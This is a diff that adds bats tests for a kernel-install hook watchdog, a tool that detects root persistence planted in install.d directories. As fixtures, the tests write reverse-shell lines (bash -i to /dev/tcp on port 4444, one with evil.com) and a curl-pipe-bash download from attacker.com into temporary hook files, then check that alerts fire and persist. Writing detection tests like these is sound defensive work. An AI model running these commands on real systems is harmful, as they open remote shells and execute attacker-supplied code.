@@ -185,3 +185,53 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-kernel-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): kernel-install-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 kernel-upgrade-triggered root exec persistence — injection
+    # alert MUST persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"kernel_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # kernel-install hook scripts are /bin/sh; # comments. Operator
+    # notes about hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# 50-depmod.install\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "run depmod"\n' > "${HOOKD}/50-depmod.install"
+    run_wd
+    ! cap | grep -q '"event":"kernel_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/kernel/install.d + /usr/lib/kernel/install.d axes — injection in ANY → alert)" {
+    # kernel-install reads from BOTH /etc + /usr/lib install.d dirs.
+    # Attacker may plant in either. Lock multi-dir axis.
+    HOOKD2="${TMP}/lib-install.d"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in second dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook.install"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/50-depmod.install"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
